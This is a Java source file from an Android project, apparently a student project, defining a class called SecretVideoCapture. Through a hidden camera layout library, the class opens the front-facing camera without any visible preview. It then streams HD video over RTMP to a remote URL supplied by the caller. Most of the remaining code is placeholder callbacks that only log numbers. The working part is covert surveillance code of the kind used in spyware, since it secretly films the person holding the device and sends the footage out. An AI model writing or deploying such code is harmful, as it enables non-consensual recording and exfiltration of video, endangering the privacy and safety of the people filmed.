package com.example.fyp_android;

import android.content.Context;
import android.util.Log;

import com.github.faucamp.simplertmp.RtmpHandler;

import java.io.IOException;
import java.net.SocketException;

import ir.mstajbakhsh.livehiddencamera.HiddenCameraLayout.CameraConfig;
import ir.mstajbakhsh.livehiddencamera.HiddenCameraLayout.CameraFacing;
import ir.mstajbakhsh.livehiddencamera.HiddenCameraLayout.HiddenCameraLayout;
import ir.mstajbakhsh.livehiddencamera.LiveBroadcaster.SrsCameraView;
import ir.mstajbakhsh.livehiddencamera.LiveBroadcaster.SrsEncodeHandler;
import ir.mstajbakhsh.livehiddencamera.LiveBroadcaster.SrsPublisher;
import ir.mstajbakhsh.livehiddencamera.LiveBroadcaster.SrsRecordHandler;

public class SecretVideoCapture implements RtmpHandler.RtmpListener, SrsRecordHandler.SrsRecordListener, SrsEncodeHandler.SrsEncodeListener {

    private SrsPublisher mPublisher;
    private SrsCameraView mCameraView;
    private Context context;
    private String url;

    SecretVideoCapture(Context context, String url) {
        this.url = url;
        this.context = context;
    }

    public void start() {
        initHiddenCam(url);
    }

    private void initHiddenCam(String rtmpURL) {
        HiddenCameraLayout l = new HiddenCameraLayout(context, new HiddenCameraLayout.PermissionHandler() {
            @Override
            public void onPermissionNotGrantedException(Exception ex) {
                Log.d("HCL", "Ask user to grant permission.");
                Log.e("HCL", ex.getMessage());
            }
        });

        //start config
        CameraConfig cameraConfig = new CameraConfig()
                .getBuilder(context)
                .setCameraFacing(CameraFacing.FRONT_FACING_CAMERA)
                .build();


        mCameraView = l.initHiddenLayout(cameraConfig);

        mPublisher = new SrsPublisher(mCameraView);
        mPublisher.setEncodeHandler(new SrsEncodeHandler(this));
        mPublisher.setRtmpHandler(new RtmpHandler(this));
        mPublisher.setRecordHandler(new SrsRecordHandler(this));
        mPublisher.setPreviewResolution(640, 360);
        mPublisher.setOutputResolution(640, 360);
        mPublisher.setVideoHDMode();
        mPublisher.startCamera();
        mPublisher.startPublish(rtmpURL);


    }

    public void stop() {
        mPublisher.stopCamera();
        mPublisher.stopPublish();
    }

    @Override
    public void onRtmpConnecting(String msg) {
        Log.w("com.example.", "1");
    }

    @Override
    public void onRtmpConnected(String msg) {
        Log.w("com.example.", "2");

    }

    @Override
    public void onRtmpVideoStreaming() {
        Log.w("com.example.", "3");

    }

    @Override
    public void onRtmpAudioStreaming() {
        Log.w("com.example.", "4");

    }

    @Override
    public void onRtmpStopped() {
        Log.w("com.example.", "5");

    }

    @Override
    public void onRtmpDisconnected() {
        Log.w("com.example.", "6");

    }

    @Override
    public void onRtmpVideoFpsChanged(double fps) {
        Log.w("com.example.", "7");

    }

    @Override
    public void onRtmpVideoBitrateChanged(double bitrate) {
        Log.w("com.example.", "8");

    }

    @Override
    public void onRtmpAudioBitrateChanged(double bitrate) {
        Log.w("com.example.", "9");

    }

    @Override
    public void onRtmpSocketException(SocketException e) {
        Log.w("com.example.", "10");

    }

    @Override
    public void onRtmpIOException(IOException e) {
        Log.w("com.example.", "11");

    }

    @Override
    public void onRtmpIllegalArgumentException(IllegalArgumentException e) {
        Log.w("com.example.", "12");

    }

    @Override
    public void onRtmpIllegalStateException(IllegalStateException e) {
        Log.w("com.example.", "13");

    }

    @Override
    public void onRecordPause() {
        Log.w("com.example.", "14");

    }

    @Override
    public void onRecordResume() {
        Log.w("com.example.", "15");

    }

    @Override
    public void onRecordStarted(String msg) {
        Log.w("com.example.", "16");

    }

    @Override
    public void onRecordFinished(String msg) {
        Log.w("com.example.", "17");

    }

    @Override
    public void onRecordIllegalArgumentException(IllegalArgumentException e) {
        Log.w("com.example.", "18");

    }

    @Override
    public void onRecordIOException(IOException e) {
        Log.w("com.example.", "19");

    }

    @Override
    public void onNetworkWeak() {
        Log.w("com.example.", "20");

    }

    @Override
    public void onNetworkResume() {
        Log.w("com.example.", "21");

    }

    @Override
    public void onEncodeIllegalArgumentException(IllegalArgumentException e) {
        Log.w("com.example.", "22");

    }

}
